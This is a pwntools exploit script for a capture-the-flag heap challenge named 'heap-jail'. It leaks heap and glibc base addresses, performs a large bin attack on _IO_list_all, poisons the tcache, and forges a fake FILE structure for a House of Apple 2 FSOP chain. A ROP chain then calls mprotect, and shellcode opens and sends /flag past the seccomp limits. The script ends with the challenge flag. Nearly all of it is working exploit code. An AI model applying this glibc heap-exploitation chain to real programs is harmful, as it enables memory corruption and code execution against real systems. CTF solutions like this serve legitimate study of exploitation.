from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./main_patched', '''
    # b *_IO_wdoallocbuf+52
    continue
''')

# p = remote('heap-jail.chal.crewc.tf', 1337, ssl=True)

def create(index, size):
    p.sendlineafter(b"Which option do you choose? \n", b'1')
    p.sendlineafter(b"Enter index: \n", str(index).encode())
    p.sendlineafter(b"Enter size: \n", str(size).encode())

def edit(index, data):
    p.sendlineafter(b"Which option do you choose? \n", b'2')
    p.sendlineafter(b"Enter index: \n", str(index).encode())
    p.sendafter(b"Enter data: \n", data)

def delete(index):
    p.sendlineafter(b"Which option do you choose? \n", b'3')
    p.sendlineafter(b"Enter index: \n", str(index).encode())

def show(index):
    p.sendlineafter(b"Which option do you choose? \n", b'4')
    p.sendlineafter(b"Enter index: \n", str(index).encode())

# seccomp rules are applied to prevent read syscall and write syscall from being called on areas other than heap

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address and glibc base address
# heap address and glibc address are already in heap area due to fopen of file '/proc/self/maps' and fgets from it
create(0, 0x400)
show(0)
heap_base_addr = u64(p.recvuntil(b"[heap]")[0:5].ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")
glibc_base_addr = int(p.recvuntil(b"libc.so.6").split(b"\n")[-1].split(b"-")[0], 16)
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: large bin attack on _IO_list_all
create(1,0x428)
create(2,0x408)
create(3,0x418)
create(4,0x408)
delete(1)
create(5,0x438)
delete(3)
# modified bk_nextsize value and keep three qwords other than bk_nextsize unchanged
edit(1, p64(glibc_base_addr+glibc_e.symbols['main_arena']+1104)*2+p64(heap_base_addr+0x35c0)+p64(glibc_base_addr+glibc_e.symbols['_IO_list_all']-0x20))
# overwrite _IO_list_all with address of fake _IO_FILE structure, which is heap_base_addr+0x3e00
create(6, 0x438)

# Stage 3: tcache poisoning for house of apple 2
# _IO_cleanup-> _IO_flush_all->_IO_wfile_overflow->_IO_wdoallocbuf
target_addr = heap_base_addr+0x3e00
payload = flat({
    # fp
    0: {
        0x20: 0, # fp->_IO_write_base
        0x28: 1, # fp->_IO_write_ptr
        0x88: glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock'], # fp->_lock
        0xa0: target_addr+0xe0, # fp->_wide_data
        0xd8: glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps'] # fp->vtable
    },
    # fp->_wide_data/fp->_wide_data->_wide_vtable
    0xe0: {
        0x18: 0, # fp->_wide_data->_IO_write_base
        0x20: [glibc_base_addr+glibc_e.symbols['do_release_shlib']+27, target_addr+0xe0+0x70-0x8], # 0x00000000000368ab: pop rbp; clc; leave; ret;
        0x30: 0, # fp->_wide_data->_IO_buf_base
        0x38: target_addr+0xe0+0x40-0x20,
        0x40: glibc_base_addr+glibc_e.symbols['__push___start_context']+63, # 0x000000000005ef6f: mov rsp, rdx; ret;
        0x68: glibc_base_addr+glibc_e.symbols['__rpc_thread_key_cleanup']+46, # 0x0000000000176f0e: mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20];
        0x70: [glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'))), (target_addr)&(~0xfff), glibc_base_addr+next(glibc_e.search(asm('pop rsi; ret;'))), 0x1000, glibc_base_addr+glibc_e.symbols['dlopen_doit']+106, target_addr+0xe0+0xb0-0x8, 0, 7, glibc_base_addr+glibc_e.sym.mprotect, target_addr+0xe0+0xe8], # 0x00000000000981aa: pop rbp; clc; pop rax; pop rdx; leave; ret;
        0xe0: target_addr+0xe0, # fp->_wide_data->_wide_vtable
        0xe8: asm('''
            lea rdi, [rip+flag]
            xor rsi, rsi
            mov rax, 2
            syscall
            mov rdi, 1
            mov rsi, rax
            xor rdx, rdx
            mov r10, 0x40
            mov rax, 40
            syscall
            flag:
                .string "/flag"
        ''')
    }
}, filler=b'\x00', length=0x208)
# arbitrary write 0x208 bytes at most from heap_base_addr+0x3e00
create(7, 0x208)
create(8, 0x208)
delete(8)
delete(7)
edit(7, p64(((heap_base_addr+0xd30)>>12)^(target_addr)))
create(7, 0x208)
create(9, 0x208)
edit(9, payload)
# trigger FSOP through exit
delete(0xff)

p.interactive()

# crew{L4rg3B1ns_FTW_f70c8418155de82fae43}